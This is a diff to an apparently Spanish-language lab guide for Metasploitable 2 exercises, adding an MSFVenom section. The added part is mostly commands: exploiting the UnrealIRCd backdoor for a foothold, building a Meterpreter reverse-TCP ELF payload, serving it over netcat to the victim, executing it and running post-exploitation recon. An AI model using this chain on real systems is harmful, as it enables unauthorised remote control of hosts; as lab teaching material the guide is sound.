@@ -394,32 +394,49 @@ vncviewer <IP_VICTIMA>:5900
 
 ## Ejercicio 9 — MSFVenom
 
+| Campo | Valor |
+|-------|-------|
+| **Qué es** | Generador de payloads de Metasploit que sustituye a `msfpayload` + `msfencode`. Permite generar binarios (ELF, EXE, etc.), scripts (Python, PHP, etc.) o shellcode en varios formatos [^15] |
+| **Utilidad** | Crear un payload ejecutable independiente para transferirlo manualmente a una máquina comprometida y obtener una sesión Meterpreter |
+| **Payload usado** | `linux/x86/meterpreter/reverse_tcp` — payload inverso x86 con capacidades avanzadas de post-explotación |
+| **Formato de salida** | `elf` — ejecutable nativo de Linux |
+
+### Guía de comandos
+
+> [!IMPORTANT]
+> **Orden temporal:** Primero se genera el payload, luego se pone el handler a la escucha, después se transfiere el archivo a la víctima, y por último se ejecuta.
+
 ```bash
-# 1. Generar payload Linux reverse shell con MSFVenom
+# PASO 0 — Obtener shell inicial en la víctima (ej. con UnrealIRCd del Ejercicio 6)
+# msfconsole > use exploit/unix/irc/unreal_ircd_3281_backdoor > set RHOSTS <IP_VICTIMA> > exploit
+# Esto abre una shell cmd/unix. Desde ahí ejecutaremos la transferencia y el payload.
+
+# PASO 1 — Generar payload Linux reverse shell con MSFVenom (en Kali)
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP_ATACANTE> LPORT=4444 -f elf -o /tmp/payload.elf
 
-# 2. Transferir payload a la máquina víctima, usaremos el VSFTPD anterior
-#    Opción B: Netcat
-#    En Kali:
-nc -lvp 4445 < /tmp/payload.elf
-#    En víctima:
-nc <IP_ATACANTE> 4445 > /tmp/payload.elf
-
-# 3. Asignar permisos de ejecución (en la víctima)
-chmod +x /tmp/payload.elf
-
-# 4. Ejecutar payload (en la víctima)
-./tmp/payload.elf
-
-# 5. Configurar handler en Metasploit para recibir la conexión
-msfconsole
+# PASO 2 — Configurar handler en Metasploit (en la MISMA terminal Kali, msfconsole)
 use exploit/multi/handler
 set payload linux/x86/meterpreter/reverse_tcp
 set LHOST <IP_ATACANTE>
 set LPORT 4444
-exploit
+# Lanzar en background (-j) para poder usar nc después
+exploit -j
 
-# 6. Una vez recibida la sesión, comprobar acceso y reunir información
+# PASO 3 — En OTRA terminal de Kali, servir el payload con Netcat
+# (el handler ya está escuchando en el puerto 4444)
+nc -lvp 4445 < /tmp/payload.elf
+
+# PASO 4 — Desde la shell de la víctima, descargar el payload
+nc <IP_ATACANTE> 4445 > /tmp/payload.elf
+
+# PASO 5 — Asignar permisos y ejecutar el payload (en la víctima)
+chmod +x /tmp/payload.elf
+/tmp/payload.elf
+
+# PASO 6 — Volver a msfconsole, la sesión Meterpreter debería haberse recibido
+sessions -i <ID_SESION>
+
+# Post-explotación
 getuid
 sysinfo
 ifconfig
@@ -446,3 +463,4 @@ cat /etc/*release
 [^12]: Rapid7 — UnrealIRCD 3.2.8.1 Backdoor: https://www.rapid7.com/db/modules/exploit/unix/irc/unreal_ircd_3281_backdoor
 [^13]: Rapid7 — Metasploitable 2 Exploitability Guide: https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide
 [^14]: Metasploit — PostgreSQL Guide: https://docs.metasploit.com/docs/pentesting/metasploit-guide-postgresql.html
+[^15]: Rapid7 — MSFVenom documentation: https://docs.rapid7.com/metasploit/msfvenom/
